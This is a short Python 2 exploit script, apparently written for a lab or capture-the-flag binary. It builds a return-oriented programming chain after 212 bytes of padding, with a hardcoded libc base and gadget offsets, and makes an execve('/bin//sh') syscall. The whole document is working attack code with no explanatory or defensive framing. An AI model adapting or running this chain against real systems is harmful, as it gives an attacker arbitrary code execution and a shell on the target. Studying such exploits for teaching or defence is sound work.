import struct

junk = "A" * 212

libc_base = 0xb7e16000
data_addr = 0x0804a024
shellcode = ""

# write "/bin//sh" to data_addr
shellcode += struct.pack('<I', libc_base + 0x000ef750) # 0x000ef750 : pop ecx ; pop eax ; ret
shellcode += "/bin"
shellcode += struct.pack('<I', data_addr)
shellcode += struct.pack('<I', libc_base + 0x0002dc1f) # 0x0002dc1f : mov dword ptr [eax], ecx ; ret

shellcode += struct.pack('<I', libc_base + 0x000ef750) # 0x000ef750 : pop ecx ; pop eax ; ret
shellcode += "//sh"
shellcode += struct.pack('<I', data_addr + 4)
shellcode += struct.pack('<I', libc_base + 0x0002dc1f) # 0x0002dc1f : mov dword ptr [eax], ecx ; ret

# write 0x00 to data_addr + 8
shellcode += struct.pack('<I', libc_base + 0x00001aa2) # 0x00001aa2 : pop edx ; ret
shellcode += struct.pack('<I', data_addr + 8)
shellcode += struct.pack('<I', libc_base + 0x0002f06c) # 0x0002f06c : xor eax, eax ; ret
shellcode += struct.pack('<I', libc_base + 0x000a6a2c) # 0x000a6a2c : mov dword ptr [edx], eax ; ret

# write {"/bin//sh", NULL} to data_addr+12
shellcode += struct.pack('<I', libc_base + 0x000ef750) # 0x000ef750 : pop ecx ; pop eax ; ret
shellcode += struct.pack('<I', data_addr)
shellcode += struct.pack('<I', data_addr + 12)
shellcode += struct.pack('<I', libc_base + 0x0002dc1f) # 0x0002dc1f : mov dword ptr [eax], ecx ; ret

# write 0x00 to data + 16
shellcode += struct.pack('<I', libc_base + 0x00001aa2) # 0x00001aa2 : pop edx ; ret
shellcode += struct.pack('<I', data_addr + 16)
shellcode += struct.pack('<I', libc_base + 0x0002f06c) # 0x0002f06c : xor eax, eax ; ret
shellcode += struct.pack('<I', libc_base + 0x000a6a2c) # 0x000a6a2c : mov dword ptr [edx], eax ; ret

# set ecx = address of {"/bin//sh", NULL}
shellcode += struct.pack('<I', libc_base + 0x000ef750) # 0x000ef750 : pop ecx ; pop eax ; ret
shellcode += struct.pack('<I', data_addr + 12)
shellcode += "AAAA"

# put /bin//sh address into ebx
shellcode += struct.pack('<I', libc_base + 0x000198ce) # 0x000198ce : pop ebx ; ret
shellcode += struct.pack('<I', data_addr)

# put 0xb into eax
shellcode += struct.pack('<I', libc_base + 0x0002f06c) # 0x0002f06c : xor eax, eax ; ret
shellcode += struct.pack('<I', libc_base + 0x00145696) # add eax, 0xb ; ret

shellcode += struct.pack('<I', libc_base + 0x0002e6a5) # 0x0002e6a5 : int 0x80

shellcode = shellcode + "\x90" * (150 - len(shellcode))

buf = junk + shellcode
print buf
